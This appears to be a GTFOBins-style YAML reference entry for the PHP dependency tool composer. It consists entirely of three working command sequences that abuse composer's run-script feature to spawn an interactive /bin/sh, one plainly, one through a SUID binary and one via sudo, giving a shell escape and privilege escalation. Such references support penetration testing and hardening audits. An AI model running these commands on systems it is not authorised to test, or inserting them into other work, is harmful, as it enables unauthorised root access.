---
functions:
  shell:
    - code: |
        TF=$(mktemp -d)
        echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
        composer --working-dir=$TF run-script x
  limited-suid:
    - code: |
        TF=$(mktemp -d)
        echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
        ./composer --working-dir=$TF run-script x
  sudo:
    - code: |
        TF=$(mktemp -d)
        echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
        sudo composer --working-dir=$TF run-script x
---
